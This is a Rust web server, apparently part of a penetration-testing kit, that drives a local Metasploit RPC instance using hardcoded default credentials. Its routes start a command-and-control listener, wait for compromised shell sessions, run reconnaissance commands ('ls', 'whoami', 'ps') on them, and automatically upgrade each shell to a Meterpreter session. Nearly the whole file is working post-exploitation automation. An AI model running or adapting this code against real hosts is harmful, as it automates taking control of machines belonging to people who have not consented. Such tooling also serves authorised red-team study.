#![feature(proc_macro_hygiene, decl_macro)]

use std::{thread,time};


use msf_client::client::MsfClient;
use msf_client::modules::MsfModule;
use msf_client::msg::SessionListRet;

#[macro_use] extern crate rocket;
#[macro_use] extern crate diesel;
#[macro_use] extern crate rocket_contrib;

mod db;
mod models;
mod techniques;

use models::Session;
use crate::techniques::cnc::msf::listener;

#[get("/start")]
fn start(sql_conn: db::DbConn) -> &'static str {
    let mut client = MsfClient::new("msf", "1234", "http://127.0.0.1:55553/api/".to_string())
                               .expect("Trying to connect");

    println!("{:?}", Session::all(&sql_conn));

    
    listener(client, sql_conn);

    "Hello World"
}
 
#[get("/exec")]
fn exec(sql_conn: db::DbConn) -> &'static str {
    let mut client = MsfClient::new("msf", "1234", "http://127.0.0.1:55553/api/".to_string())
                               .expect("Trying to connect");

    let conn_clone = client.clone_conn();

    thread::spawn(move || {
        let mut client_clone = MsfClient::new_from(conn_clone);

        let ten_milli = time::Duration::from_millis(100);

        // need to wait on at least one session
        while Session::all(&sql_conn).is_empty() {
            thread::sleep(ten_milli);
        }

        let sess_rows = Session::all(&sql_conn);

        let mut sessions = client_clone.sessions();

        for sess_row in sess_rows {
            let mut session = sessions.session(sess_row.sess_id as u32).expect("Getting session");

            loop {
                println!("{}", session.write(String::from("ls\n")));

                thread::sleep(ten_milli);

                let sess_out = session.read();
                println!("{}", sess_out);

                if sess_out.contains("PENKIT_LICENSE") {
                    break;
                }
            }
      
            println!("{}", session.write(String::from("whoami\n")));

            thread::sleep(ten_milli);

            println!("{}", session.read());

            let mut post_mod = client_clone.modules() .use_post("multi/manage/shell_to_meterpreter");

            post_mod.run_options.insert(String::from("SESSION"), String::from((sess_row.sess_id as u32).to_string()));

            let job_id_post = post_mod.exploit().expect("Running post");
            println!("{:?}", job_id_post);
        }

        // wait for new meterpreter session
        while Session::all(&sql_conn).len() < 2 {
            thread::sleep(ten_milli);
        }

        let sess_rows = Session::all(&sql_conn);

        for sess_row in sess_rows {
            let mut session = sessions.session(sess_row.sess_id as u32).expect("Getting session");
     
            println!("{}", sess_row.sess_id as u32);

            loop {
                println!("{}", session.write(String::from("ps")));

                thread::sleep(ten_milli);

                let sess_out = session.read();
                println!("{}", sess_out);

                if !sess_out.contains("Unknown command") {
                    break;
                }
            }

        }

    });

    "exec"
}

 fn main() {
     rocket::ignite()
         .attach(db::DbConn::fairing())
         .mount("/", routes![start,exec]).launch();
 }
